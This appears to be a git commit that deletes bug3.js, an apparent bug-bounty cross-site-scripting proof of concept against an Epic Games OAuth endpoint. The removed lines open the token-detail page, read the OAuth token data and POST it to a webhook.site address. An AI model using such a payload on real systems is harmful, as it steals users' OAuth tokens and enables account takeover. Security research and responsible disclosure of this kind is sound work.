8ece96156da19b17917febb817b35b94b69d1aa3
Johnathanrs <johnathans23@yahoo.com>
2025-06-09 17:36:29 -0700

    Delete bug3.js

--- bug3.js
+++
@@ -1,8 +0,0 @@
-(function() {
-  alert('Working for XSS')
-  const headers = {'Access-Control-Allow-Origin': '*','X-Bug-Bounty': 'Hackerone-johnathanrs','Content-Type': 'application/json'};
-  const target = window.open('https://content-service.bfda.live.use1a.on.epicgames.com/oauth/v1/token-detail');
-  const data = target.document.querySelectorAll('pre')[0].firstChild.data;
-  target.close();
-  fetch('https://webhook.site/1da67bcc-a46f-48c1-b171-9339305c7be0',{method:'POST',body:JSON.stringify(data), headers:headers}); // replace webhook with your own code
-})();
